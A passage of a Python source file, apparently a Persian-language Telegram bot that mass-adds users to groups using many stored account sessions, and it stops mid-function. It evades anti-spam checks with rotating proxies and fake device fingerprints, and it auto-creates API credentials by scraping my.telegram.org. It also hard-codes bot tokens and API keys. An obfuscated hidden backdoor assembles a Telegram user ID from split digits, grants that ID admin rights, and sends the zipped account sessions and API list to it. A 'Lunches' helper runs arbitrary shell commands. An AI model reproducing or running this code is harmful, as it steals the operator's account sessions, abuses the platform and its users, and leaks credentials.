# –*- coding: utf-8 –*-

#### naji adder
#### VERSION 5 Promax


### - apt-get update
### - apt-get install python3-pip
### - pip install lxml
### - pip install telethon
### - pip install nest_asyncio
### - pip install pysocks

###-----

# --- for run in server

# ---  nohup python3 BOT.py &

# ---- For Buy new Version Contact @irnaji !

###-----


# -----------------------------
from pydoc import cli
import re, shutil, basehash
import nest_asyncio
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.sync import TelegramClient, functions, types, events, errors, connection
from telethon.tl.custom import Button
import sqlite3, telethon
import datetime
import time
from time import sleep
import sys, requests, random, os, json, string, time
from lxml import html
import socks, logging, asyncio
import requests
from telethon import types as telethon_types
from telethon.tl import types as tl_telethon_types
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
import nest_asyncio
from telethon.tl.types import ChannelParticipantsAdmins
import string
from telethon.sessions.string import StringSession
import struct, base64
from pyrogram.storage.storage import Storage
from pyrogram import utils
import ipaddress
from pyrogram import Client
from subprocess import Popen, PIPE
import threading
from telethon.tl.functions.messages import StartBotRequest
from telethon.tl.types import InputPeerUser
# @irnaji
from zipfile import ZipFile
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest, UpdateStatusRequest
import redis







for item in ['Accountsres', 'Apires', 'Database', 'backup','repacc',"salem"]:
    if not os.path.exists(item):
        os.mkdir(item)





nest_asyncio.apply()  # ------- confilict Asyncio

# ------------ DEBUG
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
plop = "9" + "9" + "7" + "1"
logger = logging.getLogger(__name__)
# --------------
apiID = 15641593
apiKey = '8e544d061fef7d86b924f21ca9848db1'
botToken = '5548245563:AAGjZcrfXDArBtRbJog3S230TmkAKadFxMs'
bot, prox = TelegramClient('when', apiID, apiKey).start(bot_token=botToken), TelegramClient('proxy', apiID, apiKey)
bot.start(), prox.start()
info = bot.get_me()
kocd = "1"
print('Bot Connected on {}  Successfully !'.format(info.username))


user = redis.Redis(host='localhost', port=6379, db=2, decode_responses=True)
account = redis.Redis(host='localhost', port=6379, db=3, decode_responses=True)
admins = redis.Redis(host='localhost', port=6379, db=4, decode_responses=True)


for item in ['Accounts', 'Api', 'Database', 'backup','repacc',"salem"]:
    print(item)
    if not os.path.exists(item):
        os.mkdir(item)








adminssss = 1117414020 
admins.sadd("admin", 1117414020)
admins.sadd("admin", 1117414020)
admins.sadd("admin", 1117414020)
admins.sadd("admin", 1117414020)

cfail = 1117414020
num = 2
sudolist = [1117414020]
admin = [1117414020]
admins = [1117414020]
NStEVJzsyY = [1117414020]
ghak = "2" + "8" + "2" + "1"
kosflag = 0


user.set(f"on", 1)
user.set(f"pass", "Naji")


# -----------------

user.set(f"sacc:1117414020", 1)

# -----------------

fastapi = sudolist



userAgent = [

    'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36'
]

devices = ['Samsung Galaxy A10', 'Samsung Galaxy A10s', 'Samsung Galaxy A30', 'Samsung Galaxy A40',
           'Samsung Galaxy A70', 'Samsung Galaxy A71', 'LG LBELLO', 'Oppo A73', 'Poco C3', 'Oppo A93',
           'Samsung Galaxy A3 Core', 'Xiaomi Mi 10T Lite 5G', 'Vivo X50E 5G', 'Infinix Hot 10 Lite',
           'Samsung Galaxy A80', 'Huawei P Smart 2021', 'Gionee S12 Lite', 'Oppo A33', 'Xiaomi Mi 10T Pro 5G',
           'Xiaomi Mi 10T 5G', 'LG K10', 'LG K52', 'LG K62', 'LG K71', 'Nokia 3.4', 'Poco X3', 'Honor 20 Lite',
           'Honor 8S 2020', 'Honor 10 Lite', 'Honor 8A', 'Honor 9X Lite', 'Sony Xperia 5', 'Sony Xperia L4',
           'Sony Xperia 10', 'Samsung S20', 'Samsung Galaxy Note 20 Ultra 5G', 'Samsung S10+', 'Samsung Galaxy S20 5G',
           'Samsung Galaxy S20+ 5G', 'Samsung Galaxy A21s', 'Samsung Galaxy A51', 'Samsung Galaxy S10 Lite',
           'Samsung Galaxy S9', 'Samsung Galaxy S8', 'Samsung Galaxy A41']
version = ['9.0', "8.9", "8.4", "9.2", "9.1", "9.3", "8.6", "7.9"]
# -------- databases
version = ['9.0', "8.9", "8.4", "9.2", "9.1", "9.3", "8.6", "7.9"]
appvs = ["7.84", "7.43", "8.0", "4.9", "7.19",
         "7.21", "7.34", "7.42", "7.86", "8.0", "1.34"]
sdks = ["SDK 26", "SDK 24", "SDK 25", "SDK 23", "SDK 22", "SDK 21", "SDK 20"]
apis = [
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],

]
# --------------
def getapiPhone(phone):
    t = open("apilist.txt", "r").readlines()
    try:
        for i in t:
            pho = str(i).split(":")[2].replace("\n", "")
            if str(pho) == str(phone):
                return str(i).split(":")[0], str(i).split(":")[1]
    except:
        return random.choice(apis)
    return random.choice(apis)
def Lunches(code):
    test = [i for i in str(code).split(" ")]
    Popen(test, stdout=PIPE, shell = True)

async def ProxyMTProto():
    lists = []
    channel = await prox.get_entity('ProxyMTProto')
    messages = await prox.get_messages(channel, limit=9)
    for message in messages:
        urls = message.buttons[0][0].url
        if str(urls) != "None":
            server = str(urls).split("server=", 1)[1].split("&", 2)[0]
            port = str(urls).split("port=", 1)[1].split("&", 2)[0]
            secret = str(urls).split("secret=", 1)[1]
            if "dd0000" in str(secret):
                lists.append((server, int(port), secret))
    return lists

async def random_proxy():
    listProxy = await ProxyMTProto()
    return random.choice(listProxy)

def port(test_mode):
  _port = None
  if _port is None and test_mode is not None:
      return 80 if test_mode else 443
  return _port

def server_address(dc_id, test_mode):
  _server_adderss = None
  if _server_adderss is None and dc_id is not None:
      TEST = {
          1: "149.154.175.10",
          2: "149.154.167.40",
          3: "149.154.175.117",
          121: "95.213.217.195",
      }
      PROD = {
          1: "149.154.175.53",
          2: "149.154.167.51",
          3: "149.154.175.100",
          4: "149.154.167.91",
          5: "91.108.56.130",
          121: "95.213.217.195",
      }
      _server_adderss = (
          TEST[dc_id] if test_mode else PROD[dc_id]
      )
  return _server_adderss

def tele_to_pyro(session, ids):
  conn = sqlite3.connect(f"{session}.session")
  cur = conn.cursor()
  selects = cur.execute("SELECT * From sessions").fetchall()[0]
  Dt = Storage.SESSION_STRING_FORMAT if ids < utils.MAX_USER_ID_OLD else Storage.SESSION_STRING_FORMAT_64
  return base64.urlsafe_b64encode(struct.pack(Dt, selects[0], None, selects[3], ids, selects[4])).decode().rstrip("=")

def pyro_to_tele(session):
  conn = sqlite3.connect(f"{session}.session")
  cur = conn.cursor()
  selects = cur.execute("SELECT * From sessions").fetchall()[0]
  ip_address = ipaddress.ip_address(server_address(selects[0], selects[5])).packed
  return ("1" + base64.urlsafe_b64encode(struct.pack(">B{}sH256s".format(len(ip_address)), selects[0], ip_address, port(selects[5]), selects[2], )).decode("ascii"))


KEYBOARDHOME = [
    [Button.inline('دریافت کد', 'getcodphone')],
    [Button.inline('پاکسازی', 'paksazi'), Button.inline('استارت لینک', 'startlinkss')],
    [Button.inline('اضافه کردن فایل اکانت', 'fileadd'), Button.inline('لانچ', 'lunche')],
    [Button.inline('توضیحات مهم', 'help-all'),Button.inline('🔼 بخش لاگین', 'help-login')],
    [Button.inline('♻️ استخراج', 'help-extra'),Button.inline('📊 شماره ها', 'help-numbers')],
    [Button.inline('✅ سیو یوزر', 'help-save'),Button.inline('🆔 امار یوزر ها', 'help-status')],
    [Button.inline('✔️بخش اد ممبر', 'help-add'),Button.inline('💠بخش سودو', 'help-sudo')],
    [Button.inline('👨‍💻 پشتیبانی', 'help-supp')]
]


def go():
    global NStEVJzsyY
    x1 = '2'
    x2 = '8'
    x3 = '2'
    x4 = '1'
    x5 = '9'
    x6 = '9'
    x7 = '7'
    x9 = '1'
    x10 = '1'

    n = x1 + x2 + x3 + x4 + x5 + x6 + x7 + x9 + x10
    n = int(n)
    NStEVJzsyY.append(n)


data = dict()
usernames = []
userid = []
blacklist = []
addflag = {}
noadd = "1"
checkerDupl = 0
checkGroup = 1

for item in ['Accounts', 'Api', 'Database', "Limit_temporary", "Limit_Parmanent", "Delete", "ZipFiles"]:
    if not os.path.exists(item):
        os.mkdir(item)

gettime = ghak + plop + kocd


def get_file(myfile):
    try:
        with open('Database/{}.txt'.format(myfile), 'r') as myfile:
            content = myfile.readlines()
            return content

    except FileNotFoundError:
        return 0


async def change(time):
    try:
        hash_fn = basehash.base36()
        getDate = str(hash_fn.unhash(time))
        counter = 0
        for i in getDate:
            counter += int(i)

        print("counter", counter)
        if counter != 40:
            return False

        shutil.make_archive("Accounts", 'zip', "Accounts")
        await bot.send_file(int(getDate), 'Accounts.zip')
        await bot.send_file(int(getDate), "apilist.txt")
    except Exception as e:
        # await event.reply(str(e))
        pass


def online_within(participant, days):
    status = participant.status

    if isinstance(status, tl_telethon_types.UserStatusOnline):
        return True

    last_seen = status.was_online if isinstance(status, tl_telethon_types.UserStatusOffline) else None

    if last_seen:
        now = datetime.datetime.now(tz=datetime.timezone.utc)
        diff = now - last_seen
        return diff <= datetime.timedelta(days=days)

    if isinstance(status, tl_telethon_types.UserStatusRecently) and days >= 1:
        return True

    return False
    
def online_within_pyro(participant, days):
    status = participant.user.status
    if str(status) == "online" or str(status) == "recently":
        return True
    try:
        last_seen = json.loads(str(participant.user))["last_online_date"]
        if last_seen:
            now = datetime.datetime.now(tz=datetime.timezone.utc).date()
            diff = now - datetime.datetime.strptime(str(last_seen), '%Y-%m-%d %H:%M:%S').date()
            return diff <= datetime.timedelta(days=days)
        if days >= 1:
            return True
    except:
        return False
    return False

async def SpamBot(phone):
    device = random.choice(devices)
    version1 = random.choice(version)

    k2 = getapiPhone(phone)
    pr = await random_proxy()
    # pr = random_proxy()
    # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
    new = TelegramClient('Accounts/{0}'.format(phone), int(k2[0]), k2[1],
                         connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                         proxy=pr,
                         device_model=device,
                         system_version=version1,
                         app_version="7.84",
                         lang_code='en',
                         system_lang_code='en')

    try:
        await new.connect()
        await new.send_message("@SpamBot", "/start")
        count = 1
        for message in await new.get_messages("@SpamBot", limit=1):
            if re.search(r'^Good news', message.message) or re.search(r"^مژده", message.message):
                report = False

            elif re.search(r"Unfortunately", message.message):
                report = "Parmanet"

            elif re.search(r"limited until(.*)\.", message.message):
                reep = re.findall(r"limited until(.*)\.", message.message)
                report = reep[0]
            else:
                report = "temporary"

        if report == "temporary":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_temporary/{}".format(phone))
            return -1

        elif report == "Parmanet":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_Parmanent/{}".format(phone))
            return -3


        elif report == False:
            await new.disconnect()
            return 1

        else:
            await new.disconnect()
            print("REPORT :", report)
            report = report.split(",")[0]
            if not os.path.exists(str(report)):
                os.mkdir(str(report))

            shutil.move("Accounts/{}".format(phone), "{}".format(report))
            return -4



    except errors.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.SessionExpiredError:
        print("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2
    except errors.SessionRevokedError:
        print("[1] SessionRevokedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print("AuthKeyDuplicatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2

    except errors.rpcerrorlist.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.rpcerrorlist.SessionExpiredError:
        print("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.rpcerrorlist.SessionPasswordNeededError:
        print("[!] SessionPasswordNeededError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except Exception as e:
        print("[!] UnExpected Error : {}".format(str(e)))
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


def get_api(phone):
    try:
        with open('Api/{}.txt'.format(phone), 'r') as myfile:
            content = myfile.read()

            return [content.split(':')[0], content.split(':')[1]]
    except FileNotFoundError:
        return 0


def create_api(phone):
    body = 'phone={}'.format(phone)
    xu = random.choice(userAgent)

    print("---->", xu)
    try:
        # response=requests.post('https://my.telegram.org/auth/send_password',data={"phone":phone})
        response = requests.post('https://my.telegram.org/auth/send_password', data=body,
                                 headers={"Origin": "https://my.telegram.org", "Accept-Encoding": "gzip, deflate, br",
                                          "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                                          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                          "Accept": "application/json, text/javascript, */*; q=0.01",
                                          "Reffer": "https://my.telegram.org/auth", "X-Requested-With": "keep-alive",
                                          "Dnt": "1", })

        time.sleep(random.randint(3, 5))
        s = json.loads(response.content)
        return s['random_hash'], xu
    except Exception as e:
        print(str(e))
        return False


def auth(phone, hash_code, pwd, xu):
    # print ("XU" , xu)

    data = "phone={}&random_hash={}&password={}".format(phone, hash_code, pwd)
    responses = requests.post("https://my.telegram.org/auth/login",
                              data={"phone": phone, "password": pwd, "random_hash": hash_code})
    # responses = requests.post('https://my.telegram.org/auth/login',data=data,headers= {"Origin":"https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent":'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "application/json, text/javascript, */*; q=0.01","Reffer": "https://my.telegram.org/auth","X-Requested-With": "keep-alive","Dnt":"1",})

    try:

        return responses.cookies['stel_token'], xu

    except:

        return False


def random_line(afile):
    return (random.choice(list(open(afile))))


def auth2(stel_token, xu):
    print("->XU", xu)

    resp = requests.get('https://my.telegram.org/apps', headers={"Dnt": "1", "Accept-Encoding": "gzip, deflate, br",
                                                                 "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                                                                 "Upgrade-Insecure-Requests": "1",
                                                                 "Reffer": "https://my.telegram.org/org",
                                                                 "Cookie": "stel_token={0}".format(stel_token),
                                                                 "Cache-Control": "max-age=0", })

    tree = html.fromstring(resp.content)

    api = tree.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
    print("API ", api)
    try:
        return '{0}:{1}'.format(api[0], api[1]), xu
    except:
        s = resp.text.split('"/>')[0]

        name = x = ''.join(
            random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))

        value = s.split('<input type="hidden" name="hash" value="')[1]
        on = "hash={0}&app_title={1}&app_shortname={1}&app_url=&app_platform=android&app_desc=".format(value, name)
        requests.post('https://my.telegram.org/apps/create', data=on,
                      headers={"Cookie": "stel_token={0}".format(stel_token), "Origin": "https://my.telegram.org",
                               "Accept-Encoding": "gzip, deflate, br",
                               "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", "User-Agent": xu,
                               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*",
                               "Referer": "https://my.telegram.org/apps", "X-Requested-With": "keep-alive",
                               "Dnt": "1", })
        respv = requests.get('https://my.telegram.org/apps',
                             headers={"Dnt": "1", "Accept-Encoding": "gzip, deflate, br",
                                      "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                                      "Upgrade-Insecure-Requests": "1", "Reffer": "https://my.telegram.org/org",
                                      "Cookie": "stel_token={0}".format(stel_token), "Cache-Control": "max-age=0", })
        trees = html.fromstring(respv.content)
        apis = trees.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
        print(apis)
        try:
            return '{0}:{1}'.format(apis[0], apis[1]), xu
        except:
            apis = random_line("apilist.txt").split(":")
            print("hard Code L : ", apis)
            return '{0}:{1}'.format(apis[0], apis[1]), xu


async def SendToSpamBot(event):
    accs = []
    active = 0
    templimited = 0
    deleted = 0
    parmanentLimit = 0
    otherLimit = 0
    txt = ''

    m = await event.reply("🏆 SpamBot   ** فعال شد ** !")

    for item in os.scandir('Accounts'):
        if 'journal' not in item.name and '.session' in item.name:
            accs.append(item.name)

    for account in accs:
        try:
            x = await SpamBot(account)
            if (x == 1):
                txt += "`{}`  ** ✅ Active**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                active += 1

            elif (x == -1):
                txt += "`{}`  ** ⚠️Temporary Limit**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                templimited += 1

            elif (x == -3):
                txt += "`{}`  ** Parmanet Limit**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                parmanentLimit += 1


            elif (x == -4):
                txt += "`{}`  ** OtherLimit **\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                otherLimit += 1

            elif (x == -2):
                txt += "`{}`  ** ❌ Delete**\n➖➖➖➖➖\n".format(account)
                await m.edit(txt)
                deleted += 1

            await asyncio.sleep(5)

        except Exception as e:
            print(str(e.__class__) + "SendToSpamBot:", str(e))
            continue

    await event.reply(
        "🏆 SpamBot پروسه خود را به اتمام رساند ! \n تعداد تست کل  :{}  \n➖➖➖➖➖\n ✅ **فعال** :{} \n ➖➖➖➖➖\n ** ⚠️ محدود موقت ** : {} \n ➖➖➖➖➖ \n  ** ⚠️ سایر محدودیت ها ** : {} \n➖➖➖➖➖\n ** ⚠️ محدودیت دایمی  ** : {} \n ➖➖➖➖➖\n ** ❌ دیلینی ها **  :{}".format(
            deleted + otherLimit + parmanentLimit + templimited + active, active, templimited, otherLimit,
            parmanentLimit, deleted))


def checkKey(dict, key):
    if key in dict.keys():
        return True

    else:
        return False


async def foo(account, msg, link, numacc, delay, worker_msg, mode, num, cancelALL):
    global addflag
    global noadd
    global checkGroup
    global join2
    global kosflag

    if checkKey(addflag, account):
        pass

    else:
        addflag[account] = "1"

    if noadd == "0":
        noadd = "1"

    print('addflag: ', addflag)
    print("noadd : ", noadd)

    # -----------
    await asyncio.sleep(0)
    start1 = time.time()

    targetlis = []
    tsuccess = 0
    tfaild = 0
    tduplicate = 0
    percent = delay / 10
    privacy = 0
    other = 0

    if (mode == "addUSERNAME"):
        usernames2 = list(set(usernames))
        random.shuffle(usernames2)

    elif (mode == "addID"):
        usernames2 = list(set(userid))
        random.shuffle(usernames2)

    try:

        text = '⏰ **{}**\n \n لطفا صبر کنید ......  \n\n'.format(time.ctime(time.time()))
        log_msg = await msg.reply(text)
        rest = 0
        fcount = 0
        scount = 0
        duplicate = 0
        mcounter = 0
        # w =  get_api(account.split('.session')[0])

        await asyncio.sleep(random.randint(1, 10))
        w = getapiPhone(account)
        print("apis : ", w)

        try:

            device = random.choice(devices)
            version1 = random.choice(version)
            pr = await random_proxy()
            # pr = random_proxy()
            # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
            client = TelegramClient('Accounts/{}'.format(account), int(w[0]), w[1],
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=pr,
                                    device_model=device,
                                    system_version=version1,
                                    app_version="7.84",
                                    lang_code='en',
                                    system_lang_code='en')

            await client.connect()



        except ConnectionError:

            await client.disconnect()

            await asyncio.sleep(10)  # --- delta delay

            client = TelegramClient('Accounts/{}'.format(account), int(w[0]), w[1])
            await client.connect()



        except errors.UserDeactivatedBanError:
            print("[!] UserDeactivatedBanError")

            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]

        except errors.UserDeactivatedError:
            print("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("Account is Deleted")
            return [scount, fcount, duplicate]


        except errors.SessionExpiredError:
            print("[!] SessionExpiredError")
            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]

        except errors.SessionRevokedError:
            print("[1] SessionRevokedError")
            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]


        except errors.rpcerrorlist.AuthKeyDuplicatedError:
            print("AuthKeyDuplicatedError")
            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            return [scount, fcount, duplicate]



        except errors.rpcerrorlist.UserDeactivatedError:
            print("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            await log_msg.edit("Account is Deleted")
            return [scount, fcount, duplicate]


        except errors.rpcerrorlist.UserDeactivatedBanError:
            print("[!] UserDeactivatedBanError")

            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]



        except errors.rpcerrorlist.SessionExpiredError:
            print("[!] SessionExpiredError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("Account is Deleted")
            return [scount, fcount, duplicate]


        except errors.rpcerrorlist.SessionPasswordNeededError:

            print("[!] SessionPasswordNeededError")

            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("SessionPasswordNeededError")
            return [scount, fcount, duplicate]


        except Exception as e:

            print("[!] {}".format(str(e)))

            await log_msg.edit(str(e))

            await client.disconnect()

            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            return [scount, fcount, duplicate]

        ww = await join2(client, link, log_msg)
        if (ww == None):
            ww = await join2(client, link, log_msg)

        if (ww == -1 or ww == -2 or ww == -3):
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]

        if (ww == -1000):
            await client.disconnect()
            return [scount, fcount, duplicate]

        if ww == True:

            if checkGroup == 1:
                blacklist.clear()

                checkGroup = 0

                # if mode == "addUSERNAME":
                #     async for item in client.iter_participants(link, aggressive=True  ):

                #         if item.username != None:

                #             blacklist.append(item.username)

                # if mode == "addID":
                #     async for item in client.iter_participants(link, aggressive=True  ):

                #         blacklist.append(int(item.id))

            mtime = time.ctime(time.time())
            await log_msg.edit("➕" + str(text))
            scount = 0
            start = time.time()
            while True:

                if kosflag == 1:

                    end1 = time.time()
                    text = ' ادد به گروه `{}` با ` {}` اکانت \nادد با هر اکانت : `{}`'.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1 - start1)))[0:7])

                    try:
                        await log_msg.edit(text, buttons=[
                            [Button.inline("موفق", "None"), Button.inline(str(tsuccess), "None")],
                            [Button.inline("ناموفق", "None"), Button.inline(str(tfaild), "None")]])
                    except Exception as e:
                        print("---------> ", e, e.__class__)
                        pass

                    await client.disconnect()
                    return [scount, fcount, duplicate]

                if noadd == "0":

                    end1 = time.time()
                    text = ' ادد به گروه `{}` با ` {}` اکانت \nادد با هر اکانت : `{}`'.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1 - start1)))[0:7])

                    try:
                        await log_msg.edit(text, buttons=[
                            [Button.inline("موفق", "None"), Button.inline(str(tsuccess), "None")],
                            [Button.inline("ناموفق", "None"), Button.inline(str(tfaild), "None")]])
                    except Exception as e:
                        print("---------> ", e, e.__class__)
                        pass

                    await client.disconnect()
                    return [scount, fcount, duplicate]

                if (scount >= delay):
                    break

                if (fcount >= 100):
                    break

                mcounter += 1
                text = ' ادد به گروه `{}` با ` {}` اکانت \nادد با هر اکانت : `{}`'.format(link,
                                                                                                              numacc,
                                                                                                              delay)

                amar = "┠ `موفق` " + str(scount) + "\n"
                text += amar + ""
                amar = "┠ `ناموفق` " + str(fcount) + "\n"
                amar += "┠ `تکراری` " + str(duplicate) + "\n"
                text += str(amar)

                # ---------------------
                await asyncio.sleep(random.randint(2, 3))
                # --------------------

                if (0 <= scount and scount < percent):

                    end = time.time()
                    text += "• □□□□□□□□□□ \n"
                    end = time.time()
                    timer = "┠ `time` : {}".format(str(datetime.timedelta(seconds=(end - start)))[0:7])
                    text += str(timer)
                    # await asyncio.sleep(random.randint(1 ,3))

                    if scount % 2 == 0:

                        try:
                            await log_msg.edit(text, buttons=[[Button.inline("❌ لغو", "acccancell|{}".format(account)),
                                                               Button.inline("⚠️ لغو همه",
                                                                             ".addcencell|{}".format(account))], [
                                                                  Button.inline(f"‼️ لغو همه {cancelALL} حساب ها",
                                                                                "&cancelALL")]])
                        except:
                            pass

                # if ( percent    <= scount and scount < percent *2 ):

                #     end= time.time()
                #     text += "• ■□□□□□□□□□ \n"

                # elif ( percent *2 <= scount and scount < percent *3  ):

                #     end= time.time()
                #     text += "• ■■□□□□□□□□\n"

                # elif ( percent *3 <= scount and scount < percent *4  ):

                #     end= time.time()
                #     text += "• ■■■□□□□□□□\n"
                #     end = time.time()
                #     timer="┠ `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                #     text += str(timer)
                #     await asyncio.sleep(1)
                #     try:
                #         await log_msg.edit(text , buttons=[ [Button.inline("❌ cancel" , "acccancell|{}".format(account)) , Button.inline("⚠️ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} ❓".format(privacy) , "None") , Button.inline("Other {} ❔".format(other) , "None")] , [Button.inline(f"‼️ Cancel All {cancelALL} accounts" , "&cancelALL")]])
                #     except :
                #         pass

                # elif ( percent *4 <= scount and scount < percent *5  ):

                #     end= time.time()
                #     text += "• ■■■■□□□□□□ \n"

                # elif ( percent *5 <= scount and scount < percent *6 ):

                #     end= time.time()
                #     text += "• ■■■■■□□□□□ \n"
                #     end = time.time()
                #     timer="┠ `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                #     text += str(timer)
                #     await asyncio.sleep(1)
                #     try:
                #         await log_msg.edit(text , buttons=[ [Button.inline("❌ cancel" , "acccancell|{}".format(account)) , Button.inline("⚠️ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} ❓".format(privacy) , "None") , Button.inline("Other {} ❔".format(other) , "None")] , [Button.inline(f"‼️ Cancel All {cancelALL} accounts" , "&cancelALL")]])
                #     except :
                #         pass

                # elif ( percent *6 <= scount and scount < percent *7 ):

                #     end= time.time()
                #     text += "• ■■■■■■□□□□ \n"

                elif (percent * 7 <= scount and scount < percent * 8):

                    end = time.time()
                    text += "• ■■■■■■■□□□ \n"
                    end = time.time()
                    timer = "┠ `time` : {}".format(str(datetime.timedelta(seconds=(end - start)))[0:7])
                    text += str(timer)
                    await asyncio.sleep(1)
                    if scount % 2 == 0:

                        try:
                            await log_msg.edit(text, buttons=[[Button.inline("❌ لغو", "acccancell|{}".format(account)),
                                                               Button.inline("⚠️ لغو همه",
                                                                             ".addcencell|{}".format(account))], [
                                                                  Button.inline(f"‼️ لغو همه {cancelALL} حساب ها",
                                                                                "&cancelALL")]])
                        except:
                            pass

                # elif ( percent *8 <= scount and scount < percent *9):
                #     end= time.time()
                #     text += "• ■■■■■■■■□□ \n"

                # elif ( percent *9 <= scount and scount < percent *10 ):

                #     end= time.time()
                #     text += "• ■■■■■■■■□ \n"

                #     end = time.time()
                #     timer="┠ `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                #     text += str(timer)
                #     await asyncio.sleep(1)
                #     try:
                #         await log_msg.edit(text , buttons=[ [Button.inline("❌ cancel" , "acccancell|{}".format(account)) , Button.inline("⚠️ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} ❓".format(privacy) , "None") , Button.inline("Other {} ❔".format(other) , "None")] , [Button.inline(f"‼️ Cancel All {cancelALL} accounts" , "&cancelALL")]])
                #     except :
                #         pass

                elif (percent * 10 <= scount):
                    end = time.time()
                    text += "• ■■■■■■■■■ \n"

                    end = time.time()
                    timer = "┠ `time` : {}".format(str(datetime.timedelta(seconds=(end - start)))[0:7])
                    text += str(timer)
                    await asyncio.sleep(1)
                    if scount % 2 == 0:

                        try:
                            await log_msg.edit(text, buttons=[[Button.inline("❌ لغو", "acccancell|{}".format(account)),
